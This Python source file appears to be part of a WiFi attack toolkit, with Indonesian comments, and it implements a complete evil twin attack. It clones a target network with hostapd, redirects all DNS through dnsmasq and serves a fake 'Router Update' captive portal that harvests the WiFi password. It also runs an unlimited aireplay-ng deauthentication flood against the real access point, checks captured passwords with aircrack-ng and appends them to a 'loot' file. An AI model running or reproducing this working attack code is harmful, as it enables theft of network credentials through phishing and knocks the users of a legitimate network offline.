import os
import subprocess
import time
import threading
import logging
import sys
import re
from flask import Flask, render_template_string, request, redirect

# Import path & tools dari global config
try:
    from wifipro.core.config import EVILTWIN_DIR, HANDSHAKE_DIR
except ImportError:
    EVILTWIN_DIR = "data/eviltwin"
    HANDSHAKE_DIR = "data/handshakes"

class EvilTwin:
    def __init__(self, wifi_engine, colors):
        self.wifi = wifi_engine
        self.colors = colors
        self.template_dir = "wifipro/utils/templates"
        self.app = Flask(__name__)
        self.last_attempt = ""
        self.target_cap = "" 
        
        # Mute Flask logs biar terminal nggak berantakan
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)
        self._setup_routes()

    def _verify_password(self, password, bssid):
        """ 
        Verifier: Mencocokkan password dari portal dengan file .cap 
        Jika .cap tidak ada (Blind Mode), otomatis return True.
        """
        if not self.target_cap or not os.path.exists(self.target_cap):
            return True 
            
        cmd = [
            "aircrack-ng", "-a", "2", "-b", bssid,
            "-w", "-", self.target_cap
        ]
        try:
            # Pake stdin buat lempar password ke aircrack-ng secara instan
            proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, _ = proc.communicate(input=password)
            return "KEY FOUND!" in stdout
        except:
            return False

    def _setup_routes(self):
        """ Menangani alur data di Captive Portal """
        @self.app.route('/')
        def index():
            error = request.args.get('error')
            try:
                with open(f"{self.template_dir}/index.html", "r") as f:
                    html = f.read()
                if error:
                    # Inject pesan error jika password salah (Verified Mode)
                    msg = '<p style="color:red; text-align:center; font-weight:bold;">Otentikasi Gagal! Password salah.</p>'
                    html = html.replace('', msg)
                return render_template_string(html)
            except:
                return "<h2>Router Update</h2><form action='/login' method='post'>Password: <input type='password' name='password'><input type='submit'></form>"

        @self.app.route('/login', methods=['POST'])
        def login():
            pwd = request.form.get('password')
            bssid = request.form.get('bssid') # ID target dikirim via hidden input di HTML
            
            if self._verify_password(pwd, bssid):
                self.last_attempt = pwd
                return "OK" # Portal akan menampilkan pesan sukses/loading
            else:
                return redirect("/?error=1")

    def _cleanup_system(self):
        """ Reset ports dan matikan service yang mengganggu port 80/53 """
        c = self.colors
        print(f"  {c.Y}[*] Cleaning System Services...{c.NC}")
        os.system("sudo systemctl stop systemd-resolved apache2 > /dev/null 2>&1")
        os.system("sudo fuser -k 80/tcp 53/udp 67/udp > /dev/null 2>&1")
        os.system("sudo killall dnsmasq hostapd > /dev/null 2>&1")
        os.system("sudo iptables -F && sudo iptables -t nat -F")

    def start(self, targets):
        c = self.colors
        if not targets: return
        
        # 1. Select Target
        try:
            val = input(f"\n  {c.Q} Select Target ID for Evil Twin: ").strip()
            target = targets[int(val) - 1]
        except: return

        essid = target['essid']
        bssid = target['bssid']
        channel = str(target['ch'])
        iface = getattr(self.wifi, 'iface', 'wlan0')
        
        # 2. Alert Handshake (Peringatan saja, tidak mematikan program)
        safe_ssid = re.sub(r'[^\w]', '', essid) or "Target"
        potential_cap = os.path.join(HANDSHAKE_DIR, f"{safe_ssid}_{bssid.replace(':','')}-01.cap")

        if not os.path.exists(potential_cap):
            print(f"\n  {c.WARN} {c.R}ALERT: File .cap tidak ditemukan di {potential_cap}{c.NC}")
            print(f"  {c.Y} [!] Berjalan dalam mode BLIND (Tanpa Verifikasi Password).{c.NC}")
            self.target_cap = None
            time.sleep(2)
        else:
            print(f"\n  {c.OK} {c.G}SUCCESS: Handshake ditemukan!{c.NC}")
            print(f"  {c.G} [+] Real-time verification diaktifkan.{c.NC}")
            self.target_cap = potential_cap
            time.sleep(1)

        self._cleanup_system()

        # 3. Network & IP Setup
        print(f"  {c.INFO} Setting up IP 192.168.1.1 on {iface}...")
        os.system(f"sudo ifconfig {iface} up 192.168.1.1 netmask 255.255.255.0")
        os.system("sudo route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
        
        # 4. Generate Config Dinamis
        dns_conf = f"{self.template_dir}/dnsmasq.conf"
        with open(dns_conf, "w") as f:
            f.write(f"interface={iface}\ndhcp-range=192.168.1.10,192.168.1.100,8h\naddress=/#/192.168.1.1\n")

        ap_conf = f"{self.template_dir}/hostapd.conf"
        with open(ap_conf, "w") as f:
            f.write(f"interface={iface}\ndriver=nl80211\nssid={essid}\nhw_mode=g\nchannel={channel}\nauth_algs=1\nwmm_enabled=0\n")

        # 5. Launch Core Services
        dns_p = subprocess.Popen(["dnsmasq", "-C", dns_conf, "-d"], stdout=subprocess.DEVNULL)
        ap_p = subprocess.Popen(["hostapd", ap_conf], stdout=subprocess.DEVNULL)
        
        # Flask Captive Portal
        threading.Thread(target=lambda: self.app.run(host='0.0.0.0', port=80, debug=False, use_reloader=False), daemon=True).start()

        # 6. Deauth Attack (Kick target agar pindah ke AP kita)
        print(f"  {c.R}[!] Launching Deauth Flood to {essid}...{c.NC}")
        deauth_proc = subprocess.Popen(["aireplay-ng", "-0", "0", "-a", bssid, iface], stdout=subprocess.DEVNULL)

        print(f"\n  {c.G}[+] EVIL TWIN DEPLOYED SUCCESSFULLY!{c.NC}")
        UI_MODE = "VERIFIED" if self.target_cap else "BLIND"
        
        

        try:
            while not self.last_attempt:
                for char in ["/", "-", "\\", "|"]:
                    sys.stdout.write(f"\r  {c.Y}[{char}] {c.W}Waiting for Target in {UI_MODE} mode... {c.NC}")
                    sys.stdout.flush()
                    time.sleep(0.2)
                    if self.last_attempt: break
            
            # 7. SAVE THE LOOT
            save_path = os.path.join(EVILTWIN_DIR, f"{safe_ssid}_loot.txt")
            if not os.path.exists(EVILTWIN_DIR): os.makedirs(EVILTWIN_DIR)
            
            with open(save_path, "a") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] SSID: {essid} | Pass: {self.last_attempt} | Mode: {UI_MODE}\n")
            
            print(f"\n\n  {c.G}┌──────────────────────────────────────────┐")
            print(f"    {c.BOLD}{c.W}VICTORY! PASSWORD CAPTURED!{c.NC}")
            print(f"    {c.W}SSID     :{c.NC} {c.Y}{essid}{c.NC}")
            print(f"    {c.W}PASSWORD :{c.NC} {c.G}{self.last_attempt}{c.NC}")
            print(f"    {c.W}LOG      :{c.NC} {save_path}")
            print(f"  {c.G}└──────────────────────────────────────────┘{c.NC}")
            input(f"\n  {c.OK} Press Enter to return to main menu...")

        except KeyboardInterrupt:
            print(f"\n  {c.ERR} Attack interrupted by user.")
        finally:
            # CLEANUP TOTAL
            dns_p.terminate()
            ap_p.terminate()
            deauth_proc.terminate()
            os.system("sudo iptables -F && sudo iptables -t nat -F")
            print(f"  {c.OK} System cleaned. Interfaces restored.")